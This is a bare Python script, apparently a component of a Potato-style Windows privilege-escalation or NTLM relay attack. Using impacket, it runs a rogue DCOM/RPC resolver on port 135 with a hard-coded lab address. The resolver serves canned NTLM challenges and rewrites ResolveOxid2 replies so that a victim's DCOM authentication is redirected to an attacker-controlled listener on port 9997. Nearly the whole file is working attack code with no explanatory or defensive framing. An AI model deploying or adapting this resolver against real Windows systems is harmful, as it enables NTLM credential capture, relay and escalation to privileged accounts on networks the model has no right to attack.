from impacket.dcerpc.v5 import dcomrt
from impacket.dcerpc.v5 import rpcrt
from impacket import ntlm
import datetime
import struct


def ntlmBind(received_packet):
    resp_data = b"\x05\x00\x0c\x07\x10\x00\x00\x00\x48\x01\x04\x01\x03\x00\x00\x00" \
                b"\xd0\x16\xd0\x16\xff\xbd\x2f\x01\x05\x00\x39\x39\x39\x39\x00\x00" \
                b"\x01\x00\x00\x00\x00\x00\x00\x00\x04\x5d\x88\x8a\xeb\x1c\xc9\x11" \
                b"\x9f\xe8\x08\x00\x2b\x10\x48\x60\x02\x00\x00\x00\x0a\x05\x00\x00" \
                b"\x00\x00\x00\x00\x4e\x54\x4c\x4d\x53\x53\x50\x00\x02\x00\x00\x00" \
                b"\x0e\x00\x0e\x00\x38\x00\x00\x00\x15\x82\x89\xe2\x2e\xe6\x37\x6d" \
                b"\xd4\x60\x59\x81\x00\x00\x00\x00\x00\x00\x00\x00\xbe\x00\xbe\x00" \
                b"\x46\x00\x00\x00\x0a\x00\x61\x4a\x00\x00\x00\x0f\x43\x00\x4f\x00" \
                b"\x4e\x00\x54\x00\x4f\x00\x53\x00\x4f\x00\x02\x00\x0e\x00\x43\x00" \
                b"\x4f\x00\x4e\x00\x54\x00\x4f\x00\x53\x00\x4f\x00\x01\x00\x1e\x00" \
                b"\x44\x00\x45\x00\x53\x00\x4b\x00\x54\x00\x4f\x00\x50\x00\x2d\x00" \
                b"\x55\x00\x52\x00\x50\x00\x34\x00\x33\x00\x54\x00\x4b\x00\x04\x00" \
                b"\x1a\x00\x63\x00\x6f\x00\x6e\x00\x74\x00\x6f\x00\x73\x00\x6f\x00" \
                b"\x2e\x00\x6c\x00\x6f\x00\x63\x00\x61\x00\x6c\x00\x03\x00\x3a\x00" \
                b"\x44\x00\x45\x00\x53\x00\x4b\x00\x54\x00\x4f\x00\x50\x00\x2d\x00" \
                b"\x55\x00\x52\x00\x50\x00\x34\x00\x33\x00\x54\x00\x4b\x00\x2e\x00" \
                b"\x63\x00\x6f\x00\x6e\x00\x74\x00\x6f\x00\x73\x00\x6f\x00\x2e\x00" \
                b"\x6c\x00\x6f\x00\x63\x00\x61\x00\x6c\x00\x05\x00\x1a\x00\x63\x00" \
                b"\x6f\x00\x6e\x00\x74\x00\x6f\x00\x73\x00\x6f\x00\x2e\x00\x6c\x00" \
                b"\x6f\x00\x63\x00\x61\x00\x6c\x00\x07\x00\x08\x00\xc2\x32\x49\x27" \
                b"\x91\x51\xd8\x01\x00\x00\x00\x00"

    packet = rpcrt.MSRPCHeader(resp_data)
    packet["call_id"] = received_packet["call_id"]
    type2 = ntlm.NTLMAuthChallenge(packet["auth_data"])
    av_pairs = ntlm.AV_PAIRS(type2["TargetInfoFields"])
    packed_timestamp = struct.pack("<Q", int(datetime.datetime.now().timestamp() * 100000000))
    av_pairs[7] = packed_timestamp
    type2["TargetInfoFields"] = av_pairs.getData()
    packet["auth_data"] = type2.getData()
    return packet

def resolveOxid2Reply(received_packet):
    received_request = rpcrt.MSRPCRequestHeader(received_packet.getData())
    if received_request["auth_len"] != 0:
        resp_data = b"\x05\x00\x03\x03\x10\x00\x00\x00\x20\x00\x00\x00\x03\x00\x00\x00" \
                    b"\x20\x00\x00\x00\x00\x00\x00\x00\x05\x00\x00\x00\x00\x00\x00\x00"
        packet = rpcrt.MSRPCRespHeader(resp_data)
        packet["call_id"] = received_request["call_id"]
        packet["ctx_id"] = received_request["ctx_id"]
        return packet
    else:
        resp_data = b"\x05\x00\x02\x03\x10\x00\x00\x00\x6c\x00\x00\x00\x04\x00\x00\x00" \
                    b"\x54\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x16\x00\x00\x00" \
                    b"\x16\x00\x12\x00\x07\x00\x31\x00\x32\x00\x37\x00\x2e\x00\x30\x00" \
                    b"\x2e\x00\x30\x00\x2e\x00\x31\x00\x5b\x00\x39\x00\x39\x00\x39\x00" \
                    b"\x37\x00\x5d\x00\x00\x00\x00\x00\x0a\x00\xff\xff\x00\x00\x00\x00" \
                    b"\x11\x11\x11\x11\x22\x22\x33\x33\x44\x44\x55\x55\x55\x55\x55\x55" \
                    b"\x02\x00\x00\x00\x05\x00\x07\x00\x00\x00\x00\x00"
        packet = rpcrt.MSRPCRespHeader(resp_data)
        prevPduLen = packet["dataLen"]
        oxid2Response = dcomrt.ResolveOxid2Response(packet["pduData"])
        newaStringArray = oxid2Response['ppdsaOxidBindings']['aStringArray']
        newaStringArray[1:-6] = list("192.168.161.154[9997]".encode('UTF-8'))
        oxid2Response["ppdsaOxidBindings"]["aStringArray"] = newaStringArray
        oxid2Response["ppdsaOxidBindings"]["wNumEntries"] = len(oxid2Response["ppdsaOxidBindings"]["aStringArray"])
        oxid2Response["ppdsaOxidBindings"]["wSecurityOffset"] = len(oxid2Response["ppdsaOxidBindings"]["aStringArray"][:-4])
        packet["pduData"] = oxid2Response.getData()
        packet["dataLen"] = len(packet["pduData"])
        packet["call_id"] = received_request["call_id"]
        packet["ctx_id"] = received_request["ctx_id"]
        packet["alloc_hint"] = packet["dataLen"]
        packet["frag_len"] += packet["dataLen"] - prevPduLen
        return packet

def serverAlive2Reply(received_packet):
    resp_data = b"\x05\x00\x02\x03\x10\x00\x00\x00\x28\x00\x00\x00\x02\x00\x00\x00" \
                       b"\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" \
                       b"\x00\x00\x00\x00\x00\x00\x00\x00"
    packet = rpcrt.MSRPCRespHeader(resp_data)
    received_request = rpcrt.MSRPCRequestHeader(received_packet.getData())
    packet["call_id"] = received_request["call_id"]
    packet["ctx_id"] = received_request["ctx_id"]
    return packet


def bind(received_packet):
    if received_packet["auth_len"] != 0:
        return ntlmBind(received_packet)
    else:
        resp_data = b"\x05\x00\x0c\x03\x10\x00\x00\x00\x54\x00\x00\x00\x02\x00\x00\x00" \
                    b"\xd0\x16\xd0\x16\xff\xbd\x2f\x01\x05\x00\x39\x39\x39\x39\x00\x00" \
                    b"\x02\x00\x00\x00\x00\x00\x00\x00\x04\x5d\x88\x8a\xeb\x1c\xc9\x11" \
                    b"\x9f\xe8\x08\x00\x2b\x10\x48\x60\x02\x00\x00\x00\x03\x00\x03\x00" \
                    b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" \
                    b"\x00\x00\x00\x00"

        packet = rpcrt.MSRPCHeader(resp_data)
        packet["call_id"] = received_packet["call_id"]
        return packet


def main():
    try:
        server = rpcrt.DCERPCServer()
        server.setListenPort(135)
        server.setListenAddress("192.168.161.154")
        while True:
            server._sock.listen(10)

            server._clientSock, address = server._sock.accept()
            try:
                while True:
                    packet = rpcrt.MSRPCHeader(server.recv())
                    if packet['type'] == rpcrt.MSRPC_BIND:
                        resp = bind(packet)
                        server.send(resp)
                    elif packet['type'] == rpcrt.MSRPC_AUTH3:
                        pass
                    elif packet['type'] == rpcrt.MSRPC_REQUEST and rpcrt.MSRPCRequestHeader(packet.getData())['op_num']== 4:
                        resp = resolveOxid2Reply(packet)
                        server.send(resp)
                    elif packet['type'] == rpcrt.MSRPC_REQUEST and rpcrt.MSRPCRequestHeader(packet.getData())['op_num']== 5:
                        resp = serverAlive2Reply(packet)
                        server.send(resp)

            except Exception as e:
                print(e)
                pass
            server._clientSock.close()

    except Exception as e:
        print(e)
        server._sock.close()


if __name__ == "__main__":
    main()